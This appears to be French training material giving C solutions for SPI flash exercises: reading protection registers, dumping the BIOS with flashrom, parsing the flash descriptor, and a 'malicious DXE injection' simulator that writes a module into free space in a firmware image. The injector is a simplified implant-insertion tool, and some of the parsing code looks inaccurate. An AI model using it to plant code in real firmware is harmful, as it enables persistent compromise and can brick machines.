# Solutions - SPI Flash

## Exercice 1 : Lire les Protected Range Registers (Très facile)

**Objectif** : Afficher les plages de protection de la SPI flash.

### Solution

```c
/*
 * Lecture des Protected Range Registers (PR0-PR4)
 *
 * Compilation : gcc -o read_pr read_pr.c
 * Usage : sudo ./read_pr
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define SPI_BASE_ADDR 0xFED1F800  // Adresse MMIO typique du SPI controller
#define PR0_OFFSET 0x74           // Offset du PR0 dans le SPI controller

// Structure d'un PR register
typedef struct {
    uint32_t base;
    uint32_t limit;
    int read_protected;
    int write_protected;
} PRRange;

// Parser un PR register
PRRange parse_pr_register(uint32_t pr_value) {
    PRRange range;

    // Base = bits [12:0] << 12
    range.base = (pr_value & 0x1FFF) << 12;

    // Limit = bits [28:16] << 12
    range.limit = ((pr_value >> 16) & 0x1FFF) << 12;

    // Write Protected = bit 15
    range.write_protected = (pr_value >> 15) & 1;

    // Read Protected = bit 31
    range.read_protected = (pr_value >> 31) & 1;

    return range;
}

int main() {
    printf("[*] Lecture des Protected Range Registers\n");
    printf("[*] ==========================================\n\n");

    // Ouvrir /dev/mem pour accès MMIO
    int fd = open("/dev/mem", O_RDONLY);
    if (fd < 0) {
        perror("Erreur ouverture /dev/mem (root requis)");
        return 1;
    }

    // Mapper la région SPI controller
    volatile uint32_t* spi_regs = (volatile uint32_t*)mmap(
        NULL,
        0x1000,  // 4 KB
        PROT_READ,
        MAP_SHARED,
        fd,
        SPI_BASE_ADDR
    );

    if (spi_regs == MAP_FAILED) {
        perror("Erreur mmap");
        close(fd);
        return 1;
    }

    printf("[+] SPI Controller mappé à 0x%lX\n\n", (unsigned long)SPI_BASE_ADDR);

    // Lire les 5 PR registers
    printf("[*] Protected Range Registers (PR0-PR4)\n");
    printf("========================================\n\n");

    int found_protection = 0;

    for (int i = 0; i < 5; i++) {
        uint32_t pr_raw = spi_regs[(PR0_OFFSET / 4) + i];

        if (pr_raw == 0) {
            printf("PR%d : Non configuré\n", i);
            continue;
        }

        PRRange range = parse_pr_register(pr_raw);

        printf("PR%d : 0x%08X - 0x%08X", i, range.base, range.limit);

        if (range.read_protected || range.write_protected) {
            printf(" [");
            if (range.read_protected) printf("READ PROTECTED");
            if (range.read_protected && range.write_protected) printf(" | ");
            if (range.write_protected) printf("WRITE PROTECTED");
            printf("]");
            found_protection = 1;
        }

        printf("\n");

        // Analyse de la région
        if (range.base >= 0x200000 && range.limit <= 0x800000) {
            printf("     → Probablement la région BIOS\n");
        }
        if (range.base == 0 && range.limit <= 0x1000) {
            printf("     → Probablement le Flash Descriptor\n");
        }
    }

    printf("\n[*] Analyse de sécurité\n");
    printf("=======================\n\n");

    if (found_protection) {
        printf("[+] Protections actives détectées\n");
        printf("    → La SPI flash a des régions protégées\n");
        printf("    → Reflashing depuis l'OS sera bloqué\n");
        printf("    → Utiliser un programmeur hardware (CH341A) si nécessaire\n");
    } else {
        printf("[!] ATTENTION : Aucune protection détectée\n");
        printf("    → La SPI flash peut être modifiable depuis l'OS\n");
        printf("    → Vulnérable aux attaques de reflashing\n");
    }

    // Cleanup
    munmap((void*)spi_regs, 0x1000);
    close(fd);

    return 0;
}
```

**Explication** :
- On accède aux registres MMIO du SPI controller via `/dev/mem`
- Les PR registers sont à l'offset 0x74-0x84 dans le SPI controller
- Chaque PR définit une plage [base, limit] avec flags read/write protected
- Si des protections existent, le reflashing depuis l'OS est bloqué

---

## Exercice 2 : Dumper le firmware BIOS (Facile)

**Objectif** : Extraire le firmware UEFI/BIOS en utilisant flashrom.

### Solution

```c
/*
 * Wrapper C pour extraction firmware avec flashrom
 *
 * Compilation : gcc -o dump_bios dump_bios.c
 * Usage : sudo ./dump_bios output.bin
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <time.h>

// Vérifier si flashrom est installé
int check_flashrom() {
    struct stat st;
    if (stat("/usr/sbin/flashrom", &st) != 0 && stat("/usr/bin/flashrom", &st) != 0) {
        return -1;
    }
    return 0;
}

// Vérifier les protections
int check_protections() {
    printf("[*] Vérification des protections SPI...\n");

    FILE* fp = popen("flashrom -p internal --wp-status 2>&1", "r");
    if (!fp) {
        return -1;
    }

    char buffer[256];
    int protected = 0;

    while (fgets(buffer, sizeof(buffer), fp)) {
        printf("    %s", buffer);
        if (strstr(buffer, "write protect is enabled") ||
            strstr(buffer, "Protection range")) {
            protected = 1;
        }
    }

    pclose(fp);

    return protected;
}

// Dumper le firmware
int dump_firmware(const char* output_file) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "flashrom -p internal -r %s", output_file);

    printf("\n[*] Extraction du firmware...\n");
    printf("    Commande : %s\n\n", cmd);

    int ret = system(cmd);

    if (ret != 0) {
        printf("\n[-] Échec de l'extraction\n");
        return -1;
    }

    printf("\n[+] Firmware extrait avec succès\n");

    // Vérifier la taille du fichier
    struct stat st;
    if (stat(output_file, &st) == 0) {
        printf("[+] Taille : %.2f MB (%ld bytes)\n",
               (double)st.st_size / (1024 * 1024),
               st.st_size);

        // Calculer le hash SHA256
        char hash_cmd[512];
        snprintf(hash_cmd, sizeof(hash_cmd), "sha256sum %s", output_file);
        printf("\n[*] Hash SHA256 :\n");
        system(hash_cmd);
    }

    return 0;
}

// Analyser le firmware avec UEFIExtract
int analyze_firmware(const char* firmware_file) {
    printf("\n[*] Souhaitez-vous analyser le firmware avec UEFIExtract ? (y/N) : ");
    char response;
    scanf(" %c", &response);

    if (response != 'y' && response != 'Y') {
        return 0;
    }

    // Vérifier si UEFIExtract est disponible
    struct stat st;
    if (stat("/usr/bin/UEFIExtract", &st) != 0 &&
        stat("/usr/local/bin/UEFIExtract", &st) != 0) {
        printf("[-] UEFIExtract non trouvé\n");
        printf("    Installation : git clone https://github.com/LongSoft/UEFITool && build\n");
        return -1;
    }

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "UEFIExtract %s", firmware_file);

    printf("[*] Extraction des modules UEFI...\n");
    system(cmd);

    printf("\n[+] Modules extraits dans %s.dump/\n", firmware_file);
    printf("[*] Vous pouvez maintenant analyser les DXE/PEI modules\n");

    return 0;
}

int main(int argc, char** argv) {
    if (getuid() != 0) {
        printf("[-] Ce programme nécessite les privilèges root\n");
        return 1;
    }

    if (argc < 2) {
        printf("Usage: %s <output_file.bin>\n", argv[0]);
        printf("Exemple: %s bios_backup.bin\n", argv[0]);
        return 1;
    }

    const char* output_file = argv[1];

    printf("[*] Extracteur de firmware BIOS/UEFI\n");
    printf("[*] ====================================\n\n");

    // Vérifier flashrom
    if (check_flashrom() != 0) {
        printf("[-] flashrom n'est pas installé\n");
        printf("    Installation : sudo apt install flashrom\n");
        return 1;
    }

    printf("[+] flashrom détecté\n\n");

    // Vérifier les protections
    int protected = check_protections();

    if (protected) {
        printf("\n[!] AVERTISSEMENT : Protections SPI détectées\n");
        printf("    L'extraction peut échouer ou être partielle\n");
        printf("    Solution : Utiliser un programmeur hardware (CH341A)\n\n");
        printf("[?] Continuer quand même ? (y/N) : ");
        char response;
        scanf(" %c", &response);
        if (response != 'y' && response != 'Y') {
            return 0;
        }
    } else {
        printf("\n[+] Aucune protection détectée, extraction possible\n");
    }

    // Dumper
    if (dump_firmware(output_file) != 0) {
        return 1;
    }

    // Proposer analyse
    analyze_firmware(output_file);

    printf("\n[*] Opération terminée\n");
    printf("\n[*] Recommandations :\n");
    printf("    1. Conserver ce dump en lieu sûr (backup)\n");
    printf("    2. Analyser avec UEFITool pour identifier les modules\n");
    printf("    3. Comparer avec le firmware officiel du vendor\n");
    printf("    4. Rechercher des modules DXE suspects\n");

    return 0;
}
```

**Utilisation** :
```bash
sudo ./dump_bios bios_backup.bin
```

**Explication** :
- On utilise `flashrom` en mode interne pour lire la SPI flash
- On vérifie d'abord les protections avec `--wp-status`
- Si le dump réussit, on calcule le hash SHA256 pour vérification d'intégrité
- On propose d'analyser le firmware avec UEFIExtract

---

## Exercice 3 : Parser le Flash Descriptor (Moyen)

**Objectif** : Analyser la structure du Flash Descriptor et afficher les régions.

### Solution

```c
/*
 * Parser de Flash Descriptor Intel
 *
 * Compilation : gcc -o parse_descriptor parse_descriptor.c
 * Usage : ./parse_descriptor bios_dump.bin
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define DESCRIPTOR_SIGNATURE 0x0FF0A55A

// Structure du Flash Descriptor
typedef struct {
    uint32_t signature;
    uint32_t descriptor_map[3];
    uint32_t component_section[3];
    uint32_t reserved[3];
    uint32_t flash_regions[5];
    uint32_t master_access[3];
} __attribute__((packed)) FlashDescriptor;

// Noms des régions
const char* region_names[] = {
    "Flash Descriptor",
    "BIOS",
    "ME (Management Engine)",
    "GbE (Gigabit Ethernet)",
    "Platform Data"
};

// Parser les régions
void parse_regions(FlashDescriptor* desc) {
    printf("\n[*] Régions Flash\n");
    printf("=================\n\n");

    for (int i = 0; i < 5; i++) {
        uint32_t region = desc->flash_regions[i];

        if (region == 0x00007FFF || region == 0) {
            printf("%s : Non définie\n", region_names[i]);
            continue;
        }

        // Base = bits [15:4] << 12
        uint32_t base = ((region & 0xFFFF) << 12);

        // Limit = bits [31:20] << 12
        uint32_t limit = (((region >> 16) & 0xFFFF) << 12) | 0xFFF;

        uint32_t size = limit - base + 1;

        printf("%s :\n", region_names[i]);
        printf("    Base  : 0x%08X\n", base);
        printf("    Limit : 0x%08X\n", limit);
        printf("    Taille: %.2f KB (%.2f MB)\n",
               (double)size / 1024,
               (double)size / (1024 * 1024));
        printf("\n");
    }
}

// Parser les permissions d'accès
void parse_master_access(FlashDescriptor* desc) {
    printf("[*] Master Access Section\n");
    printf("=========================\n\n");

    const char* masters[] = {"CPU/Host", "ME", "GbE"};

    for (int i = 0; i < 3; i++) {
        uint32_t access = desc->master_access[i];

        uint16_t read_access = access & 0xFFFF;
        uint16_t write_access = (access >> 16) & 0xFFFF;

        printf("%s :\n", masters[i]);
        printf("    Read  : ");

        for (int r = 0; r < 5; r++) {
            if (read_access & (1 << r)) {
                printf("%s ", region_names[r]);
            }
        }
        printf("\n");

        printf("    Write : ");
        for (int w = 0; w < 5; w++) {
            if (write_access & (1 << w)) {
                printf("%s ", region_names[w]);
            }
        }
        printf("\n\n");
    }

    // Analyse de sécurité
    printf("[*] Analyse de sécurité\n");
    printf("=======================\n\n");

    uint16_t cpu_write = (desc->master_access[0] >> 16) & 0xFFFF;

    if (cpu_write & (1 << 1)) {  // Bit 1 = BIOS region
        printf("[!] ATTENTION : CPU peut écrire la région BIOS\n");
        printf("    → Reflashing possible depuis l'OS\n");
        printf("    → Vulnérable aux attaques firmware\n");
    } else {
        printf("[+] CPU ne peut PAS écrire la région BIOS\n");
        printf("    → Reflashing bloqué (protection active)\n");
        printf("    → Programmeur hardware requis pour modification\n");
    }
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <bios_dump.bin>\n", argv[0]);
        return 1;
    }

    const char* filename = argv[1];

    printf("[*] Parser de Flash Descriptor\n");
    printf("[*] ==============================\n\n");

    FILE* f = fopen(filename, "rb");
    if (!f) {
        perror("Erreur ouverture fichier");
        return 1;
    }

    // Lire le descriptor (4 KB)
    FlashDescriptor desc;
    if (fread(&desc, sizeof(desc), 1, f) != 1) {
        printf("[-] Erreur lecture Flash Descriptor\n");
        fclose(f);
        return 1;
    }

    fclose(f);

    // Vérifier la signature
    if (desc.signature != DESCRIPTOR_SIGNATURE) {
        printf("[-] Signature invalide : 0x%08X (attendu 0x%08X)\n",
               desc.signature, DESCRIPTOR_SIGNATURE);
        printf("    Ce fichier n'est pas un firmware valide ou corrompu\n");
        return 1;
    }

    printf("[+] Flash Descriptor valide (signature OK)\n");

    // Parser les régions
    parse_regions(&desc);

    // Parser les permissions
    parse_master_access(&desc);

    return 0;
}
```

**Explication** :
- Le Flash Descriptor est aux 4 premiers KB de la SPI flash
- Il contient la signature `0x0FF0A55A`
- Les régions sont définies par base/limit (format packed)
- La Master Access Section définit qui peut lire/écrire chaque région

---

## Exercice 4 : Simuler une injection DXE (Difficile)

**Objectif** : Créer un module DXE basique et simuler son injection dans un firmware.

### Solution

```c
/*
 * Simulateur d'injection DXE malveillant
 *
 * ATTENTION : ÉDUCATIF UNIQUEMENT !
 * Ne PAS flasher sur un vrai système sans backup !
 *
 * Compilation : gcc -o dxe_injector dxe_injector.c
 * Usage : ./dxe_injector firmware.bin malicious_dxe.efi output.bin
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>

// Créer un DXE stub basique
int create_dxe_stub(const char* output_file) {
    printf("[*] Création d'un DXE stub...\n");

    FILE* f = fopen(output_file, "wb");
    if (!f) {
        perror("Erreur création fichier");
        return -1;
    }

    // Header PE minimal (simplifié pour la démo)
    uint8_t pe_header[] = {
        // DOS Header
        0x4D, 0x5A, 0x90, 0x00,  // "MZ" signature
        // ... (header complet serait trop long pour cet exemple)
    };

    // Pour une vraie injection, il faudrait un DXE complet compilé avec EDK II
    // Ici on simule juste la structure

    // Écrire un marker reconnaissable
    const char marker[] = "MALICIOUS_DXE_IMPLANT_MARKER";
    fwrite(marker, strlen(marker), 1, f);

    printf("[+] DXE stub créé : %s\n", output_file);
    printf("    Note : Ceci est un stub de démonstration\n");
    printf("    Un vrai DXE nécessite EDK II pour la compilation\n");

    fclose(f);
    return 0;
}

// Trouver un espace libre dans le firmware
long find_free_space(FILE* f, size_t min_size) {
    uint8_t buffer[4096];
    long offset = 0;
    size_t consecutive_ff = 0;

    while (fread(buffer, 1, sizeof(buffer), f) > 0) {
        for (size_t i = 0; i < sizeof(buffer); i++) {
            if (buffer[i] == 0xFF) {
                consecutive_ff++;
                if (consecutive_ff >= min_size) {
                    return offset + i - min_size + 1;
                }
            } else {
                consecutive_ff = 0;
            }
        }
        offset += sizeof(buffer);
    }

    return -1;
}

// Injecter le DXE dans le firmware
int inject_dxe(const char* firmware_file, const char* dxe_file, const char* output_file) {
    printf("\n[*] Injection du DXE dans le firmware...\n");

    // Ouvrir le firmware source
    FILE* fw = fopen(firmware_file, "rb");
    if (!fw) {
        perror("Erreur ouverture firmware");
        return -1;
    }

    // Lire tout le firmware en mémoire
    fseek(fw, 0, SEEK_END);
    long fw_size = ftell(fw);
    fseek(fw, 0, SEEK_SET);

    printf("[+] Taille firmware : %ld bytes (%.2f MB)\n",
           fw_size, (double)fw_size / (1024 * 1024));

    uint8_t* fw_data = malloc(fw_size);
    if (!fw_data) {
        printf("[-] Allocation mémoire échouée\n");
        fclose(fw);
        return -1;
    }

    fread(fw_data, 1, fw_size, fw);
    fclose(fw);

    // Lire le DXE
    FILE* dxe = fopen(dxe_file, "rb");
    if (!dxe) {
        perror("Erreur ouverture DXE");
        free(fw_data);
        return -1;
    }

    fseek(dxe, 0, SEEK_END);
    long dxe_size = ftell(dxe);
    fseek(dxe, 0, SEEK_SET);

    printf("[+] Taille DXE : %ld bytes\n", dxe_size);

    uint8_t* dxe_data = malloc(dxe_size);
    fread(dxe_data, 1, dxe_size, dxe);
    fclose(dxe);

    // Trouver un espace libre (zone remplie de 0xFF)
    printf("[*] Recherche d'espace libre dans le firmware...\n");

    long inject_offset = -1;
    for (long i = 0; i < fw_size - dxe_size; i++) {
        int is_free = 1;
        for (long j = 0; j < dxe_size; j++) {
            if (fw_data[i + j] != 0xFF) {
                is_free = 0;
                break;
            }
        }
        if (is_free) {
            inject_offset = i;
            break;
        }
    }

    if (inject_offset == -1) {
        printf("[-] Aucun espace libre trouvé pour injection\n");
        printf("    Taille requise : %ld bytes\n", dxe_size);
        free(fw_data);
        free(dxe_data);
        return -1;
    }

    printf("[+] Espace libre trouvé à l'offset 0x%lX\n", inject_offset);

    // Injection
    memcpy(fw_data + inject_offset, dxe_data, dxe_size);

    printf("[+] DXE injecté avec succès\n");

    // Écrire le firmware modifié
    FILE* out = fopen(output_file, "wb");
    if (!out) {
        perror("Erreur création fichier de sortie");
        free(fw_data);
        free(dxe_data);
        return -1;
    }

    fwrite(fw_data, 1, fw_size, out);
    fclose(out);

    printf("[+] Firmware modifié sauvegardé : %s\n", output_file);

    // Avertissement
    printf("\n[!] AVERTISSEMENT CRITIQUE\n");
    printf("===========================\n\n");
    printf("Le firmware modifié a été créé mais :\n");
    printf("1. Ceci est une DÉMONSTRATION - le DXE est un stub non fonctionnel\n");
    printf("2. NE PAS flasher sur un vrai système sans vérification complète\n");
    printf("3. Un firmware corrompu = BRICK de la carte mère\n");
    printf("4. Toujours avoir un backup et un programmeur hardware\n");
    printf("5. Pour un vrai DXE, compiler avec EDK II + UEFITool pour injection\n");

    free(fw_data);
    free(dxe_data);

    return 0;
}

int main(int argc, char** argv) {
    printf("[*] Simulateur d'injection DXE\n");
    printf("[*] ==============================\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  1. Créer un DXE stub  : %s --create-stub output.efi\n", argv[0]);
        printf("  2. Injecter dans firmware : %s firmware.bin dxe.efi output.bin\n", argv[0]);
        return 1;
    }

    // Mode création de stub
    if (strcmp(argv[1], "--create-stub") == 0) {
        if (argc < 3) {
            printf("Usage: %s --create-stub output.efi\n", argv[0]);
            return 1;
        }
        return create_dxe_stub(argv[2]);
    }

    // Mode injection
    if (argc < 4) {
        printf("Usage: %s firmware.bin dxe.efi output.bin\n", argv[0]);
        return 1;
    }

    const char* firmware = argv[1];
    const char* dxe = argv[2];
    const char* output = argv[3];

    return inject_dxe(firmware, dxe, output);
}
```

**Utilisation** :
```bash
# 1. Créer un stub DXE
./dxe_injector --create-stub malicious.efi

# 2. Injecter dans le firmware
./dxe_injector bios_dump.bin malicious.efi bios_infected.bin
```

**Explication** :
- On cherche une zone libre dans le firmware (remplie de 0xFF)
- On injecte le DXE à cet emplacement
- Dans la réalité, il faudrait aussi :
  - Compiler un vrai DXE avec EDK II
  - Utiliser UEFITool pour une injection propre
  - Mettre à jour les tables FFS (Firmware File System)
  - Recalculer les checksums

**IMPORTANT** : Ne jamais flasher un firmware modifié sans backup complet et programmeur hardware disponible !

---

## Auto-évaluation

Avant de passer au module suivant, vérifie que tu peux :

- [x] Expliquer la structure de la SPI flash (Descriptor, ME, BIOS, TSEG)
- [x] Lire et interpréter les Protected Range Registers
- [x] Dumper un firmware avec flashrom
- [x] Parser le Flash Descriptor et analyser les permissions
- [x] Comprendre le concept d'injection DXE
- [x] Identifier les protections hardware (BIOS_WE, PR, SMRR)

**Module suivant** : [A09 - Bootkit Concepts](../A09_bootkit_concepts/)
